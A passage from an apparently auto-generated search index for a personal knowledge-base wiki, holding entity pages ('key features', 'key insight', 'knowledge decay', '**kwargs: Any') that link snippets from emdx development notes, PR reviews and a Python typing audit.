\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>pulldown-cmark</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/key-features/","title":"key features","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2025-07-07</p>"},{"location":"entities/key-features/#documents-15","title":"Documents (15)","text":"<ul> <li>#6449 Implement emdx compact command   Section: Implementation Complete </li> <li>Discovery mode (<code>--dry-run</code>): Free, local TF-IDF clustering with union-find algorithm</li> <li> <p>Synthesis mode: Claude Opus API for intelligent document merging -...</p> </li> <li> <p>#6345 Delegate: Command Helpers Implementation [3/12]</p> <p>A <code>@handle_command_error</code> decorator for consistent error handling</p> </li> </ul> <p>Then refactor commands (core.py, browse.py, tags.py) to use these helpers. ## Implementation</p>"},{"location":"entities/key-features/#key-features_1","title":"Key Features","text":""},{"location":"entities/key-features/#created-emdxcommands_helperspy","title":"Created <code>emdx/commands/_helpers.py</code>","text":"<p>The module provides:</p> <ul> <li> <p>**`require_document(iden...</p> </li> <li> <p>#6343 Delegate: Claude-Save Hook Implementation [12/12]</p> <p><code>~/.claude/hooks/README.md</code> - Documentation for hooks directory</p> </li> <li> <p>Updated <code>~/.claude/settings.json</code> - Added hook configuration:    ```json    {      \"env\": {        \"CLAUDE_HOOK_DEBUG\": \"1\"      },      \"hooks\": {        \"PreToolUse\": [    ...</p> </li> <li> <p>#6191 Delegate: analysis [3/3]</p> <p>\u2514\u2500\u2500 utils/               # Shared utilities     \u251c\u2500\u2500 git_ops.py       # Git operations     \u251c\u2500\u2500 text_formatting.py     \u2514\u2500\u2500 ... ```</p> </li> </ul>"},{"location":"entities/key-features/#key-features_2","title":"Key Features","text":""},{"location":"entities/key-features/#1-knowledge-base-operations","title":"1. Knowledge Base Operations","text":"<ul> <li>Save documents: From files, stdin, or direct text input</li> <li> <p>**Full...</p> </li> <li> <p>#6158 Delegate: analysis [5/5]</p> <p>Version 0.14.0. ### Core Purpose</p> </li> <li>Full-text searchable personal knowledge base</li> <li>AI-powered task delegation and autonomous execution</li> <li>TUI (Terminal User Interface) browser for navigation</li> <li>Git integration for project-aware document management</li> </ul> <p>...</p> <ul> <li> <p>#6154 Delegate: analysis [3/3]</p> <p>\u251c\u2500\u2500 database/       # SQLite operations \u2502   \u251c\u2500\u2500 documents.py # Document CRUD \u2502   \u251c\u2500\u2500 search.py    # FTS5 search \u2502   \u251c\u2500\u2500 cascade.py   # Cascade metadata \u2502   \u2514\u2500\u2500 connection.py \u251c\u2500\u2500 services/       # Business logic layer \u2502   \u251c\u2500\u2500 unified_executor.py  # CL...</p> </li> <li> <p>#50 Claude Backup System v2 - Clean Foundation</p> <p>Create First Backup</p> </li> </ul> <pre><code># Test the system\nclaude-backup --help\n\n# Create your first backup\nclaude-backup\n</code></pre>"},{"location":"entities/key-features/#3-set-up-automated-backups-optional","title":"3. Set Up Automated Backups (Optional)","text":"<p>```fish</p>"},{"location":"entities/key-features/#for-macos-daily-at-2-am","title":"For macOS (daily at 2 AM)","text":"<p>echo \"0 2 * * * /usr/local/bin/fish -c 'source ~/dev/clau...</p> <ul> <li>#6 MCP Interactive Terminal Support   Section: mcpterm - TUI-Compatible Terminal Sessions </li> <li>Stateful terminal sessions - Commands remember context (like current directory)</li> <li> <p>TUI/ncurses support - The <code>runScreen</code> tool captures screen output from...</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> </li> <li>Emoji Tag System: Text aliases \u2192 emoji conversion (e.g., <code>gameplan</code> \u2192 \ud83c\udfaf)</li> <li>Full-Text Search: SQLite FTS5 with stemming and intelligent ranking</li> <li> <p>**AI Age...</p> </li> <li> <p>#6594 Delegate: Research what a great README rewrite for emdx would look lik [1/4]   Section: Proposed New Structure</p> </li> <li>Save anything: Files, notes, command output</li> <li>Delegate to Claude: Parallel tasks, pipelines, PR creation</li> <li> <p>Search everything: F...</p> </li> <li> <p>#6593 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]</p> <p>\"What if something goes wrong?\" \u2192 Dry-run mode, rollback support</p> </li> <li>\"I have duplicates already\" \u2192 Dedup during import</li> </ul>"},{"location":"entities/key-features/#key-features_3","title":"Key Features","text":""},{"location":"entities/key-features/#3-key-features","title":"3. Key Features","text":""},{"location":"entities/key-features/#4-key-features-3-4-bullet-points-max","title":"4. Key Features (3-4 bullet points max)","text":""},{"location":"entities/key-features/#key-features-for-adoption","title":"Key Features for Adoption","text":"<p>```bash</p>"},{"location":"entities/key-features/#confidence-building-workflow","title":"Confidence-building workflow","text":"<p>emdx import ./vault --dry-run           # Preview eve...</p> <ul> <li>#6450 Implement emdx distill command   Section: 2. emdx/commands/distill.py <p>Key Features:</p> </li> <li>Uses <code>@app.callback(invoke_without_command=True)</code> pattern for lazy loading</li> <li> <p><code>_find_documents()</code> helper uses hybrid search for topics, tag search for filters -...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>Key Features:</p> </li> <li>Process health monitoring (zombie/stale detection)</li> <li>Log file management</li> <li> <p>Real-time execution monitoring via <code>emdx exec</code> commands</p> </li> <li> <p>#158 UV Packaging and Distribution Guide for Claude Knowledge   Section: What is UV?</p> </li> <li>10-100x faster than pip</li> <li>Drop-in replacement for pip and pip-tools</li> <li>Built-in virtual environment management</li> <li> <p>Python version management (like py...</p> </li> <li> <p>#4 CLA Textual Migration Plan</p> <p>Main Application Layout</p> </li> <li>Header: Title and stats (total documents, current filter)</li> <li>Search Bar: Always visible, with real-time filtering</li> <li>Main Container (Horizontal split):</li> <li>Left Pane (40%): Scrollable table with columns: ID, Ti...</li> </ul>"},{"location":"entities/key-features/#key-features_4","title":"Key Features:","text":""},{"location":"entities/key-features/#related-entities","title":"Related Entities","text":"<ul> <li><code>project structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>emdx codebase analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>version:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>parallel</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>optional dependencies heavy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>license:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>lazy loading heavy</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx delegate --pr \"fix bug\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx delegate \"analyze auth\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>configuration management</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/key-insight/","title":"key insight:","text":"<p>Type: concept | Mentioned in: 10 documents | First seen: 2026-02-15</p>"},{"location":"entities/key-insight/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6771 Wiki Generation Architecture Research \u2014 Complete Analysis   Section: 4. GitBook</p> <p>Key insight: AI-native from day one. LLM-ready output formats should be a first-class feature.</p> </li> <li> <p>#6761 Obsidian Publish and Wiki Generation UX Research   Section: 1. Wikilinks: How Automatic Linking Works</p> <p>...both filenames AND aliases</p> </li> <li>Generates <code>[[Full Name|AI]]</code> format automatically</li> <li> <p>Key insight: Aliases multiply matching coverage without duplicate files</p> </li> <li> <p>#6746 Delegate: Research Obsidian community plugins for auto-linking and kno [5/5]   Section: 3. Auto-Linking Plugins (Internal Note Wikification)</p> <p>...ia mode\" (link only first occurrence) and paragraph mode (first per paragraph)</p> </li> <li>Key insight: Users reported needing significant manual review \u2014 \"I commonly had to review the generated output to make sure the text wasn't overlinked\"</li> <li> <p>Assessment: The fi...</p> </li> <li> <p>#6723 Wiki Generation Architecture Research \u2014 Topic Clustering Algorithms   Section: Data Landscape (Measured)</p> <p>Key insight: 82% of entities are unique to one doc (typical of a diverse personal KB). The useful signal for clustering lives in the 4,245 entities that appear in 2+ docs. The...</p> </li> <li> <p>#6718 Wiki Generation Architecture Research   Section: 2. AI-Powered Wiki Generators</p> <p>...\"Ask\" feature:** Query the generated wiki with retrieval-augmented generation</p> </li> <li> <p>Key insight: Generates wiki structure (table of contents, categories) alongside content \u2014 the LLM decides both what articles exist AND what they say</p> </li> <li> <p>#6717 Wiki Generation Architecture Research [4/10]   Section: 2. Incremental vs Full Rebuild Tradeoffs</p> <p>Key insight: The cluster structure is stable \u2014 adding 1 doc to a 687-doc corpus rarely changes more than 1-2 clusters. Re-clustering is free (2 sec TF-IDF). Re-synthesis is exp...</p> </li> <li> <p>#6642 Delegate: Research the current state of the ActivityTable implementati   Section: 2. <code>refresh_items(items)</code> \u2014 Diff-Based Update (line 120)</p> <p>Key insight: The structural-change detection compares the full ordered list of keys, so even a single reorder triggers a full repopulate. Only pure value changes (status, title text, timestamp) get the efficient in-place path.</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 2. <code>emdx/models/tags.py</code> \u2014 MAJOR CHANGES**</p> <p>Key insight: The deduplication logic in <code>get_document_tags()</code> and <code>get_tags_for_documents()</code> exists because a document might have both <code>\"gameplan\"</code> (text) and <code>\"\ud83c\udfaf\"</code> (emoji) sto...</p> </li> <li> <p>#6570 Delegate: Analyze the output capture and auto-save fallback in emdx/co [1/3]   Section: 1.3 Claude CLI Output Parsing</p> <p>Key insight: <code>cli_result.output</code> contains either:</p> </li> <li>The <code>result</code> field from the final JSON line (Claude's summary)</li> <li> <p>OR all concatenated assistant text blocks (fallback)</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: 6. WORKFLOW DIFFERENCES</p> <p>...and discovery (<code>--each</code>)</p> </li> <li>Creates PRs (<code>--pr</code>), uses worktrees (<code>--worktree</code>)</li> <li>Key insight: Agents are invoked by delegate, not running interactively</li> </ul>"},{"location":"entities/key-insight/#related-entities","title":"Related Entities","text":"<ul> <li><code>what:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>quartz</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>dataview plugin</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>breadcrumbs plugin</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>stats:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>features:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>document clustering</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>cross-link injection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>article synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>approach:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/knowledge-decay/","title":"knowledge decay","text":"<p>Type: concept | Mentioned in: 13 documents | First seen: 2026-02-13</p>"},{"location":"entities/knowledge-decay/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: The 7 Features</p> <p>...al \u2014 overnight KB consolidation | #6101 | feat/dream-journal | pending | | 6 | Knowledge Decay \u2014 spaced resurfacing of stale docs | #6102 | feat/knowledge-decay | pending | | 7 | Ask the KB** \u2014 RAG Q&amp;A improvements | #6103 | feat/ask-kb | pending |</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: PRIORITY ORDER (for real this time)</p> <p>...ium effort</p> </li> <li>Dream Journal (#3) \u2014 overnight consolidation, medium effort</li> <li>Knowledge Decay (#6) \u2014 spaced resurfacing, low effort</li> <li> <p>Ask the KB (#7) \u2014 RAG Q&amp;A, already partially built</p> </li> <li> <p>#6724 Wiki Generation Architecture Research [9/10]   Section: Recommended Implementation Order</p> <p>.../llm-as-a-judge)</p> </li> <li>RAG Evaluation Survey</li> <li>Knowledge Decay in RAG Systems</li> <li> <p>[Microsoft LLM Eval Metrics](https://learn.m...</p> </li> <li> <p>#6369 Delegate: Re-implement the Knowledge Decay feature (originally PR #451)   Section: Knowledge Decay Feature Implementation (Issue #451)</p> </li> <li> <p>#6350 Delegate: Rebase the feat/knowledge-decay branch onto main and resolve [2/5]   Section: Conflicts Resolved</p> </li> </ul> <pre><code>67fd317 test: Add unit tests for Knowledge Decay feature\n6978a32 feat: Knowledge Decay with stale docs and touch command\n</code></pre> <ul> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR Status</p> <p>...created | | #449 | Dream Journal | \u2705 PASSING | Cleanup PR #476 created | | #451 | Knowledge Decay | \u2705 PASSING | Complete | | #453 | Ask the KB | \u2705 PASSING | Complete |</p> </li> <li> <p>#6206 Tomorrow's Tasks: Fix Wave for 4 Sprint PRs   Section: Tomorrow's Tasks: Fix Wave for Sprint PRs</p> </li> <li>PR #453 (Ask the KB) \u2705 \u2014 DRY'd up filters, added 21 tests</li> <li>PR #451 (Knowledge Decay) \u2705 \u2014 Added unit tests</li> <li> <p>PR #446 (Smart Priming) \u2705 \u2014 Fixed DB column name, moved import, added tests</p> </li> <li> <p>#6189 Delegate: Fix PR #451 (Knowledge Decay). Checkout branch feat/knowledg [2/2]   Section: Task Complete: Added Unit Tests for Knowledge Decay (PR #451)</p> </li> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Summary by PR</p> <p>...mport | | #449 | Dream Journal | \u2705 Approve with changes | Missing tests | | #451 | Knowledge Decay | \u2705 Approve | Missing tests (minor) | | #452 | Auto-Linking | \u2705 Approve | Missing tests, depth calc bug | | #453 | Ask the KB | \u2705 Approve | Good quality | | #454 | S...</p> </li> <li> <p>#6149 Delegate: Review PR #451 (Knowledge Decay). Run: gh pr diff 451. Check [4/7]   Section: PR #451 Review: Knowledge Decay Feature</p> </li> <li> <p>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: Knowledge Decay Implementation Complete</p> <p>Implemented the Knowledge Decay feature (Gameplan #6102) for spaced resurfacing of stale documents.</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing</p> </li> </ul>"},{"location":"entities/knowledge-decay/#summary","title":"Summary","text":"<p>Re-implemented the Knowledge Decay feature from scratch against current main.</p>"},{"location":"entities/knowledge-decay/#commits-after-rebase","title":"Commits After Rebase","text":""},{"location":"entities/knowledge-decay/#already-fixed-tests-added-issues-resolved","title":"Already Fixed (tests added + issues resolved):","text":""},{"location":"entities/knowledge-decay/#summary_1","title":"Summary","text":"<p>Added comprehensive unit tests in <code>tests/test_stale.py</code> for the Knowledge Decay feature.</p>"},{"location":"entities/knowledge-decay/#summary_2","title":"Summary","text":"<p>PR implements Knowledge Decay feature per gameplan #6102. Adds <code>emdx stale</code> and <code>emdx touch</code> commands plus <code>emdx prime --smart</code> integration.</p>"},{"location":"entities/knowledge-decay/#gameplan-6-knowledge-decay-spaced-resurfacing","title":"Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing","text":""},{"location":"entities/knowledge-decay/#vision","title":"Vision","text":"<p>Important docs that haven't been viewed in a while get automatically resurfaced. Borrows from spaced repetition: the KB actively reminds you what you're forgetting, prioritized by importa...</p> <ul> <li>#6099 Gameplan #3: Smart Priming   Section: Implementation Steps <p>...importance &gt; threshold AND days_stale &gt; 14</p> </li> <li>This is a lite version of Feature #6 (Knowledge Decay)</li> </ul>"},{"location":"entities/knowledge-decay/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_stale.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>spaced resurfacing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>importance scoring</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>feature deep dive</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>feat/knowledge-decay</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>ask the kb</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>... normal prime output ...</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>semantic find</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>prototype results</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>auto-linking on save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/kwargs-any/","title":"**kwargs: any","text":"<p>Type: tech_term | Mentioned in: 21 documents | First seen: 2026-02-14</p>"},{"location":"entities/kwargs-any/#documents-21","title":"Documents (21)","text":"<ul> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Overview</p> <p>This task completed Phase 4 of the type system audit, replacing <code>dict[str, Any]</code> return types and <code>**kwargs: Any</code> patterns with concrete TypedDict definitions in the commands layer.</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins</p> </li> </ul>"},{"location":"entities/kwargs-any/#changes-made","title":"Changes Made","text":""},{"location":"entities/kwargs-any/#1-changed-kwargs-any-to-kwargs-object-in-ui-__init__-methods","title":"1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods","text":"<p>Files modified: - <code>emdx/ui/cascade/cascade_view.py</code> - <code>CascadeView.__init__</code> - <code>emdx/ui/browser_container.py</code> - <code>BrowserContainer.__init__</code> and <code>exit</code> met...</p> <ul> <li>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged) <ul> <li><code>emdx/commands/delegate.py</code>: <code>**kwargs: Any</code> in <code>_safe_create_task</code>, <code>_safe_update_task</code>, <code>_safe_update_execution</code> - forwards to typed functions</li> </ul> </li> <li> <p><code>emdx/models/tasks.py</code>: `update_task(task_id: int, **kwarg...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 4. No changes needed for <code>stage_summary_bar.py</code> and <code>document_list.py</code></p> <p>These files only use <code>Any</code> for <code>**kwargs: Any</code> which is a standard pattern for Textual widget initialization. <code>document_list.py</code> already uses <code>CascadeDocumentListItem</code> TypedDict from <code>emdx/database/types.py</code>.</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols   Section: 3. Updated <code>emdx/ui/vim_editor.py</code></p> <ul> <li><code>VimEditor.__init__</code>: Changed <code>app_instance: Any</code> to <code>app_instance: VimEditorHost</code></li> </ul> </li> <li> <p><code>**kwargs: Any</code> to <code>**kwargs: object</code> (standard pattern for widget kwargs passed to parent)</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code></p> <p>...KeybindingRegistry<code>instance or None | | 82 |</code>def init(self, ..., args: Any, kwargs: Any)<code>|</code>args: object, **kwargs: object<code>| Standard pattern for passing through to parent</code>App.init<code>| | 85 |</code>self.browser_states: dict[str, Any]<code>|</code>dict[str, dic...</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 1: <code>__init__</code> parameters</p> <p>Current signature (line 247):</p> </li> </ul> <pre><code>def __init__(self, *args: Any, **kwargs: Any) -&gt; None:\n</code></pre> <ul> <li>#6487 Any Type Removal Analysis [3/5]   Section: 1. Line 51: <code>PaletteResultWidget.__init__</code> kwargs <p>Current:</p> </li> </ul> <pre><code>def __init__(self, result: PaletteResultItem, **kwargs: Any) -&gt; None:\n</code></pre> <ul> <li>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 1. emdx/commands/ (11 files audited) <p>Skip:</p> </li> <li><code>delegate.py</code>: <code>**kwargs: Any</code> pattern is appropriate for forwarding</li> <li> <p><code>review._output_json()</code>: Generic JSON output needs <code>Any</code></p> </li> <li> <p>#6440 Remove unused kwargs and tighten SQL param types   Section: Changes Made</p> <ol> <li>emdx/database/groups.py:create_group \u2014 Removed unused <code>**kwargs: Any</code> parameter</li> </ol> </li> <li>emdx/database/groups.py:list_groups \u2014 Removed unused <code>**kwargs: Any</code> parameter  </li> <li> <p>emdx/database/groups.py:list_groups \u2014 Changed `params: list...</p> </li> <li> <p>#6437 Any/None typing audit [synthesis]   Section: Patterns of Any Usage</p> <ol> <li>Dynamic Kwargs (4 occurrences) - <code>**kwargs: Any</code></li> </ol> </li> <li>Used in update functions with whitelist validation</li> <li> <p>Verdict: Mixed - some are unused (remove), others are intentional (consider TypedDict)</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: cascade/stage_summary_bar.py</p> Function Location Any Usage Replaceable? Suggested Replacement <code>__init__</code> L39 <code>**kwargs: Any</code> \u274c No Widget passthrough </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: delegate.py</p> <p>...|----------|-----------|--------------|----------------| | <code>_safe_create_task</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding pattern | | <code>_safe_update_task</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding pattern | | <code>_safe_update_execution</code> | <code>**kwargs: Any</code> | \u274c No | Forwarding...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: tasks.py</p> <p>...st[Any]<code>| SQL params in</code>list_tasks()<code>| \u2705 Yes |</code>list[str | int]<code>| | Line 185</code>**kwargs: Any<code>|</code>update_task()<code>kwargs | \u2705 Yes | See note below | | Line 262</code>params: list[Any]<code>| SQL params in</code>get_ready_tasks()<code>| \u2705 Yes |</code>list[str | int]<code>| | Line 467</code>ra...</p> </li> <li> <p>#6432 Any/None typing audit [1/5]   Section: groups.py</p> <p>...|----------|-----------|--------------|----------------------| | <code>create_group</code> | <code>**kwargs: Any</code> | Yes | Remove <code>**kwargs</code> entirely (unused, absorbs typos silently) | | <code>list_groups</code> | <code>params: list[Any]</code>, <code>**kwargs: Any</code> | Partial | <code>params</code> is legit;...</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: emdx/commands/delegate.py</p> </li> <li>Location: Line 53</li> <li>Current Type: <code>**kwargs: Any</code></li> <li> <p>Actual Type: Should use specific keyword arguments matching <code>create_task()</code> signature, or create a TypedDict <code>CreateTaskParams</code></p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 3. Text Area Host Protocol \u2014 <code>app_instance: Any</code> (5 occurrences)</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: High Severity Issues (12)</p> </li> </ul>"},{"location":"entities/kwargs-any/#1-widget-kwargs-any-patterns-low-priority","title":"1. Widget <code>**kwargs: Any</code> Patterns (Low Priority)","text":"<p>Found in ~15 places across UI files. These are passed to Textual's <code>Widget.__init__()</code> which doesn't export typed kwargs.</p>"},{"location":"entities/kwargs-any/#1-kwargs-any-in-__init__-methods-10-occurrences","title":"1. <code>**kwargs: Any</code> in <code>__init__</code> methods (10 occurrences)","text":"<p>Solution: Replace with <code>**kwargs: object</code> \u2014 simple, low-risk change for forwarded kwargs.</p>"},{"location":"entities/kwargs-any/#38-_safe_create_taskkwargs-any","title":"38. <code>_safe_create_task(**kwargs: Any)</code>","text":""},{"location":"entities/kwargs-any/#in-text_areaspy-inputspy-vim_editorpy","title":"In text_areas.py, inputs.py, vim_editor.py:","text":"<p>def init(self, app_instance: TextAreaHost, args: Any, *kwargs: Any) -&gt; None: ```</p>"},{"location":"entities/kwargs-any/#12-lazy-group-command-registry-uses-any","title":"12. Lazy group command registry uses Any","text":"<p>File: <code>emdx/utils/lazy_group.py:102,154,167,186,189</code> Issue: Multiple <code>*args: Any</code> and <code>**kwargs: Any</code> patterns that bypass type checking Severity: HIGH</p>"},{"location":"entities/kwargs-any/#related-entities","title":"Related Entities","text":"<ul> <li><code>app_instance: any</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> <li><code>vimedittextarea.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>vimeditor.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>selectiontextarea.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>any type annotation audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>titleinput.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>kwargs: any</code> to `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>group: dict[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>params: list[any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>**kwargs: object</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> </ul>"},{"location":"entities/kwargs/","title":"**kwargs","text":"<p>Type: tech_term | 